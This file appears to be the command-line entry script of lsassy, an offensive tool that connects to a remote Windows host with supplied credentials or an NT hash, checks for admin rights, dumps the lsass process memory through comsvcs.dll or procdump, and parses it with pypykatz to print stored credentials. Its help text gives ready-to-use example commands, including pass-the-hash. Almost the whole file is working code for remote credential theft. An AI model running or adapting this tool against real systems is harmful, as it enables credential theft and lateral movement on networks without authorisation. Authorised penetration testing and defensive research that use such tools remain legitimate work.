#!/usr/bin/env python3
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com [FR]
#  https://en.hackndo.com [EN]

import sys

import pkg_resources
from pypykatz.pypykatz import pypykatz

from lsassy.dumper import Dumper
from lsassy.impacketconnection import ImpacketConnection
from lsassy.impacketfile import ImpacketFile
from lsassy.log import Logger
from lsassy.parser import Parser
from lsassy.utils import *
from lsassy.defines import *

version = pkg_resources.require("lsassy")[0].version


def run():
    import argparse

    examples = '''examples:
    
  ** RunDLL Dump Method **
  lsassy adsec.local/pixis:p4ssw0rd@dc01.adsec.local
  
  ** Try all methods **
  lsassy -m 0 adsec.local/pixis:p4ssw0rd@dc01.adsec.local

  ** Procdump Dump Method **
  lsassy -m 2 -p /tmp/procdump.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
  
  ** Remote parsing only **
  lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
  
  ** Output functions **
  lsassy -j -q localuser@desktop01.adsec.local
  lsassy -g --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local'''

    parser = argparse.ArgumentParser(
        prog="lsassy",
        description='lsassy v{} - Remote lsass dump reader'.format(version),
        epilog=examples,
        formatter_class=argparse.RawTextHelpFormatter
    )

    group_dump = parser.add_argument_group('dump')
    group_dump.add_argument('-m', '--method', action='store', default="1", help='''Dumping method
    0: Try all methods (dll then procdump) to dump lsass, stop on success (Requires -p if dll method fails)
    1: comsvcs.dll method, stop on success (default)
    2: Procdump method, stop on success (Requires -p)
    3: comsvcs.dll + Powershell method, stop on success
    4: comsvcs.dll + cmd.exe method''')
    group_dump.add_argument('--dumpname', action='store', help='Name given to lsass dump (Default: Random)')
    group_dump.add_argument('-p', '--procdump', action='store', help='Procdump path')
    group_dump.add_argument('--timeout', default="10", action='store', help='Timeout before considering lsass was not dumped successfully')

    group_auth = parser.add_argument_group('authentication')
    group_auth.add_argument('--hashes', action='store', help='[LM:]NT hash')

    group_out = parser.add_argument_group('output')
    group_out.add_argument('-j', '--json', action='store_true',help='Print credentials in JSON format')
    group_out.add_argument('-g', '--grep', action='store_true', help='Print credentials in greppable format')
    group_extract = parser.add_argument_group('remote parsing only')
    group_extract.add_argument('--dumppath', action='store', help='lsass dump path (Format : c$/Temp/lsass.dmp)')

    parser.add_argument('-r', '--raw', action='store_true', help='No basic result filtering (Display host credentials and duplicates)')
    parser.add_argument('-d', '--debug', action='store_true', help='Debug output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode, only display credentials')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
    parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(RetCode(ERROR_MISSING_ARGUMENTS).error_code)

    args = parser.parse_args()
    logger = Logger(args.debug, args.quiet)

    conn = ImpacketConnection.from_args(args, logger)

    if isinstance(conn, RetCode):
        return_code = conn
        lsassy_exit(logger, return_code)

    return_code = conn.isadmin()
    if not return_code.success():
        conn.close()
        lsassy_exit(logger, return_code)

    dumper = None
    ifile = None

    try:
        if not args.dumppath:
            dumper = Dumper(conn, args, logger)
            ifile = dumper.dump()
            if isinstance(ifile, RetCode):
                return_code = ifile
            else:
                logger.success("Process lsass.exe has been dumped")
        else:
            ifile = ImpacketFile(conn, logger).open(args.dumppath)
            if not isinstance(ifile, ImpacketFile):
                return_code = ifile

        if return_code.success():
            dumpfile = pypykatz.parse_minidump_external(ifile)
            ifile.close()
            parser = Parser(dumpfile, logger)
            parser.output(args)
    except KeyboardInterrupt as e:
        print("\nQuitting gracefully...")
        return_code = RetCode(ERROR_USER_INTERRUPTION)
    except Exception as e:
        return_code = RetCode(ERROR_UNDEFINED, e)
        pass
    finally:
        try:
            ifile.close()
        except Exception as e:
            pass
        if dumper is not None:
            dumper.clean()
        conn.close()
        lsassy_exit(logger, return_code)


if __name__ == '__main__':
    run()
